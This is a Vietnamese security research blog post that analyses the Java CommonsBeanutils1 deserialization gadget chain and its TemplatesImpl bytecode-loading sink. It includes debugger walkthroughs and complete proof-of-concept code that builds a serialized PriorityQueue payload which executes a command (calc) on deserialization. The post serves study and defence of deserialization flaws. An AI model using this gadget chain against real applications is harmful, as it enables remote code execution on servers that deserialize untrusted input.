---
layout: single
title: "Phân tích gadget CommonsBeanutils1"
date: 2026-04-22 16:00:00 +0700
categories: [Java]
tags: [Java, Java Deserialize, CommonsBeanutils1]
---

# Phân tích gadget CommonsBeanutils1

## Phân tích sink là TemplatesImpl

`com.sun.org.apache.xalan.internal.xsltc.trax.TemplateImpl` là một class nằm trong thư viện Apache Xalan có sẵn trong java runtime nhằm phục vụ quá trình transform XML document, tuy nhiên lại bị lợi dụng rất nhiều trong các bộ deserialization gadget chain do có thể thực hiện load bytecode dẫn đến thực thi command tùy ý.

### Setup

Gadget chain :

```
TemplatesImpl.newTransformer()
	TemplatesImpl.getTransletInstance()
		TemplatesImpl.defineTransletClasses()
			TransletClassLoader.defineClass()
```

Đầu tiên đọc `.class` đã được compile của class `EvilTemplatesImpl` thành mảng byte.

Sau đó tạo object `TemplatesImpl` với các field quan trọng được set bằng cách dùng reflection.

Sau khi hàm `newTransformer()` được gọi, payload ở `TemplatesImpl.class` được trigger.

### Debug

Gadget này được trigger khi ta gọi `newTransformer()` của class `TemplatesImpl` nên ta bắt đầu đặt breakpoint từ hàm `newTransformer()` của class `TemplatesImpl`.

<picture>
  <img src="https://dungnhvhust.github.io/images/ds11.png" data-src-ignore>
</picture>

```java
protected TransformerImpl(Translet translet, Properties outputProperties,
        int indentNumber, TransformerFactoryImpl tfactory)
    {
        ...
    }
```

Sau khi hàm `newTransformer()` được gọi, đầu tiên nó sẽ khởi tạo Object `TransformerImpl` mới với tham số `translet` là `getTransletInstance()` , `outputProperties` là `_outputProperties`, `identNumber` là `_indentNumber` và `tfactory` là `_tfactory` .

Tiếp tục đặt break point tại hàm `getTransletInstance()` :

<picture>
  <img src="https://dungnhvhust.github.io/images/ds12.png" data-src-ignore>
</picture>

Để hàm `defineTransletClasses()` được gọi,thì `_name` phải khác `null` nên cần phải set giá trị cho `_name` bằng reflection.

`TemplatesImpl#defineTransletClasses()` là method gọi `TransletClassLoader#defineClass()`.

Đặt breakpoint tại hàm `defineTransletClasses()`

<picture>
  <img src="https://dungnhvhust.github.io/images/ds13.png" data-src-ignore>
</picture>

```java
private void defineTransletClasses()
    throws TransformerConfigurationException {
    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }
    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); // NOTE: gọi TransformerFactoryImpl#getExternalExtensionsMap()

            }
        });
    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];
        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]); // NOTE: defineClass load bytecode
            final Class superClass = _class[i].getSuperclass();

            // Check if this is the main class
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) { // NOTE: check superclass
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }
        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

Lúc này hàm `defineClass()` được gọi với `_bytecodes[]` là mảng byte code của `EvilTemplatesImpl.class` mà ta truyền vào.

### Phân tích cơ chế load bytecode trong java

Ví dụ với `ClassLoader#defineClass` :

`defineClass` thật ra là một Java native method được viết bằng C giúp chuyển đổi byte stream thành một java class hoàn chỉnh trong runtime.

Tuy nhiên method `defineClass` có thuộc tính protected nên phải tạo một subclass kế thừa nó hoặc dùng đến reflection mới có thể sử dụng trực tiếp:

<picture>
  <img src="https://dungnhvhust.github.io/images/ds14.png" data-src-ignore>
</picture>

Ví dụ, tạo một class `Hello` với default constructor in thông báo hello:

```java
package evil;

public class Hello {

    public Hello() {
        System.out.println("Hello class say hello!");
    }
}
```

Compile class này sau đó thử load bytecode bằng cách dùng reflection:

```java
public static void main(String[] args) throws Exception {
    // Đường dẫn đến file .class đã biên dịch
    Path path = Paths.get("D:\\lab\\java\\CreateClass\\target\\classes\\evil\\Hello.class");
    byte[] bArr = Files.readAllBytes(path);

    // Sử dụng Reflection để lấy class ClassLoader
    Class cls = Class.forName("java.lang.ClassLoader");

    // Lấy phương thức defineClass (phương thức này mặc định là protected)
    Method method = cls.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);

    // Cho phép truy cập vào phương thức protected
    method.setAccessible(true);

    // Gọi phương thức defineClass để nạp mảng byte thành một Class thực thụ
    Class hello = (Class) method.invoke(ClassLoader.getSystemClassLoader(), bArr, 0, bArr.length);

    // Khởi tạo một đối tượng mới của class vừa nạp (để chạy constructor của class đó)
    hello.newInstance();
}
```

<picture>
  <img src="https://dungnhvhust.github.io/images/ds15.png" data-src-ignore>
</picture>

Tuy nhiên khi `defineClass` được gọi, class object sẽ không được khởi tạo mà chỉ khi ta tự gọi đến constructor của nó ( ở đây là `newInstance()` ).

Vậy nên nếu muốn dùng `defineClass` để thực thi mã bất kì khi load bytecode thì bắt buộc phải tìm cách gọi được constructor.

### Load bytecode using TemplatesImpl

Do class `ClassLoader` khai báo `defineClass` với thuộc tính protected, nên ta sẽ sử dụng 1 class khác đã override method `defineClass` là `TransletClassLoader`

```java
static final class TransletClassLoader extends ClassLoader {
        private final Map<String,Class> _loadedExternalExtensionFunctions;
        /**
         * Access to final protected superclass member from outer class.
         */
        Class defineClass(final byte[] b) {
            return defineClass(null, b, 0, b.length);
        }
    }
```

Do `defineClass` không được khai báo scope nên scope của nó là default nên `TemplatesImpl` có thể gọi tới các method của nó được.

Như đã nói ở trên, mặc dù đã gọi được `defineClass` để load byte code, nhưng để thực thi được thì hàm `newInstance()` phải được gọi.

<picture>
  <img src="https://dungnhvhust.github.io/images/ds16.png" data-src-ignore>
</picture>

Để luồng thực thi đi tới `_class[_transletIndex].newInstance()`, chương trình phải đi qua nhánh `if (_class == null) defineTransletClasses();` . Trong `defineTransletClasses()`, tồn tại một số điều kiện kiểm tra có thể khiến quá trình dừng lại hoặc không tiếp tục tới bước khởi tạo instance.

Vì ta đã set giá trị `_bytecodes` là mảng bytecodes của `EvilTemplatesImpl.class` nên `_bytecodes` luôn khác `null`.

```java
if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }
```

Sau khi `defineClass`, class được load phải có superclass là `AbstractTranslet` thì `_transletIndex` mới có giá trị lớn hơn 0.

```java
    // Check if this is the main class
    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
        _transletIndex = i;
    }
    else {
        _auxClasses.put(_class[i].getName(), _class[i]);
        }
    }

    ...

    if (_transletIndex < 0) {
        ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
```

Do đó khi tạo `_bytecodes` là bytecode để khởi tạo malicious class, class này còn phải là `subclass của com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`.

Ngoài ra `_tfactory` cần là `TransformerFactoryImpl` object do trong `TemplatesImpl#defineTransletClasses()` có gọi đến method `TransformerFactoryImpl#getExternalExtensionsMap()`

```java
TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });
```

### POC

Ta tạo được malicious class :

`EvilTemplatesImpl.java` :

```java
public class EvilTemplatesImpl extends AbstractTranslet {
    // implements interface method thuộc interface Translet:
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}

    // implements abstract method thuộc superclass AbstractTranslet:
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {}
    public EvilTemplatesImpl() throws Exception {
        super();
        Runtime.getRuntime().exec(new String[]{"calc"});
    }
}
```

POC :

```java
public class Main {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        // java bytecode class EvilTemplatesImpl
        Path path = Paths.get("D:\\PrfD\\Security\\Research\\Java\\Java_Reflection\\Begin\\DebugGadget\\TemplateImpl_chain\\target\\classes\\org\\example\\EvilTemplatesImpl.class");
        byte[] bArr = Files.readAllBytes(path);

        TemplatesImpl tplsImpl = new TemplatesImpl();
        setFieldValue(tplsImpl, "_bytecodes", new byte[][]{bArr});
        setFieldValue(tplsImpl, "_name", "ahihi");
        setFieldValue(tplsImpl, "_tfactory", new TransformerFactoryImpl());

        tplsImpl.newTransformer();
    }
}
```

<picture>
  <img src="https://dungnhvhust.github.io/images/ds17.png" data-src-ignore>
</picture>

---

## Phân tích chain CommonsBeanutils1

Chain này có sử dụng sink `TemplatesImpl`.

Full chain:

```
PriorityQueue.readObject()
    PriorityQueue.heapify()
        PriorityQueue.siftDown()
            PriorityQueue.siftDownUsingComparator()
                BeanComparator.compare()
                    PropertyUtils.getProperty
                        TemplatesImpl.getOutputProperties()
                            |TemplatesImpl.newTransformer()
                            |TemplatesImpl.getTransletInstance()
                            |TemplatesImpl.defineTransletClasses()
                            |TransletClassLoader.defineClass()
```

### Debug

Vì chain được trigger khi gọi method `readObject()` của class `PriorityQueue` nên ta đặt breakpoint tại hàm này:

<picture>
  <img src="https://dungnhvhust.github.io/images/ds18.png" data-src-ignore>
</picture>

Tiếp tục đặt breakpoint ở hàm `heapify()`

<picture>
  <img src="https://dungnhvhust.github.io/images/ds19.png" data-src-ignore>
</picture>

Đặt breakpoint tại hàm `siftDown()`

<picture>
  <img src="https://dungnhvhust.github.io/images/ds20.png" data-src-ignore>
</picture>

Nếu field `comparator` khác null sẽ sử dụng `siftDownUsingComparator()` :

```java
private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
```

Ở đây gọi đến method `compare()`.

`BeanComparator` là một class trong `commons-beanutils` để so sánh liệu 2 JavaBeans có giống nhau, nó implements `java.util.Comparator interface` với method `compare()` gọi đến `PropertyUtils.getProperty` :

<picture>
  <img src="https://dungnhvhust.github.io/images/ds21.png" data-src-ignore>
</picture>

Thư viện Apache Commons Beanutils cung cấp nhiều methods để làm việc với các JavaBeans trong java, trong đó có static method `PropertyUtils.getProperty` cho phép người dùng gọi getter method của class JavaBeans bất kỳ, ví dụ:

```java
PropertyUtils.getProperty(new Person(), "name");
```

Thì commons-beanutils sẽ tự động tìm getter method từ name attribute -> `getName` (đơn giản là viết hoa chữ cái đầu xong prefix thêm `get`) và invoke method đó để lấy giá trị trả về. Ngoài ra `PropertyUtils.getProperty` còn hỗ trợ đệ quy, vd object a chứa b, b chứa c :

```java
PropertyUtils.getProperty(a, "b.c");
```

Nhờ vào method này gọi được getter method của JavaBeans bất kỳ, ở đây có thể dùng nó để gọi đến `TemplatesImpl#getOutputProperties()`

<picture>
  <img src="https://dungnhvhust.github.io/images/ds23.png" data-src-ignore>
</picture>

<picture>
  <img src="https://dungnhvhust.github.io/images/ds22.png" data-src-ignore>
</picture>

Ta có `TemplatesImpl#getOutputProperties` cũng có thuộc tính public và gọi đến `newTransformer()`.

```java
public synchronized Properties getOutputProperties() {
    try {
        return newTransformer().getOutputProperties();
    }
    catch (TransformerConfigurationException e) {
        return null;
    }
}
```

Đến đây nối tiếp vào sink `TemplatesImpl` ta có thể RCE.

### POC

Vẫn sử dụng malicious class của sink `TemplatesImpl`

`EvilTemplatesImpl.java` :

```java
public class EvilTemplatesImpl extends AbstractTranslet {
    // implements interface method thuộc interface Translet:
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}

    // implements abstract method thuộc superclass AbstractTranslet:
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {}
    public EvilTemplatesImpl() throws Exception {
        super();
        Runtime.getRuntime().exec(new String[]{"calc"});
    }
}
```

POC :

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;
import org.apache.commons.beanutils.BeanComparator;

public class Main {
    private static String serTest(Object obj) throws Exception {
        ByteArrayOutputStream bArr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bArr);
        oos.writeObject(obj);
        oos.close();

        byte[] bytes = bArr.toByteArray();
        return Base64.getEncoder().encodeToString(bytes);
    }

    private static void deserTest(String input) throws Exception {
        byte[] bArr = Base64.getDecoder().decode(input);
        InputStream is = new ByteArrayInputStream(bArr);
        ObjectInputStream ois = new ObjectInputStream(is);
        ois.readObject();
        ois.close();
    }

    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {

        // java bytecode class EvilTemplatesImpl
        Path path = Paths.get("D:\\PrfD\\Security\\Research\\Java\\Java_Reflection\\Begin\\DebugGadget\\TemplateImpl_chain\\target\\classes\\org\\example\\EvilTemplatesImpl.class");

        byte[] bArr = Files.readAllBytes(path);

        // Setup sink TemplatesImpl
        TemplatesImpl tplsImpl = new TemplatesImpl();
        setFieldValue(tplsImpl, "_bytecodes", new byte[][]{bArr});
        setFieldValue(tplsImpl, "_name", "ahihi");
        setFieldValue(tplsImpl, "_tfactory", new TransformerFactoryImpl());

        // Setup chain CommonsBeanutils1
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(beanComparator);
        // add giá trị dummy để tránh trigger compare() sớm
        priorityQueue.add(1);
        priorityQueue.add(1); // size = 2

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(priorityQueue, "queue", new Object[]{tplsImpl, tplsImpl});
        // Deser
        String serialized = serTest(priorityQueue);
        deserTest(serialized);

    }

}
```

Khi khởi tạo `PriorityQueue`, nếu chèn trực tiếp `TemplatesImpl` vào internal `queue` ngay từ đầu thì trong quá trình `heapify` (cụ thể là lúc `size > 1`), `PriorityQueue` sẽ gọi `compare()`.

Điều này dẫn tới việc chain bị kích hoạt ngay trong lúc build payload (local), gây RCE trên chính máy tạo payload.

Vì vậy cần thêm giá trị dummy trước để khởi tạo queue an toàn rồi sau đó dùng reflection thay thế mảng queue bên trong bằng `TemplatesImpl`.

```java
private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        // half = floor(size / 2)
        // nếu size <= 1 → half = 0
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
```

<picture>
  <img src="https://dungnhvhust.github.io/images/ds24.png" data-src-ignore>
</picture>

<script>
function forceLoadImages() {
  document.querySelectorAll("img").forEach(img => {
    if (img.dataset && img.dataset.src) {
      img.src = img.dataset.src;
      img.removeAttribute("lazyload");
    }
  });
}

// chạy lần đầu
forceLoadImages();

// chạy lại mỗi khi Swup load page
document.addEventListener("swup:contentReplaced", forceLoadImages);
</script>
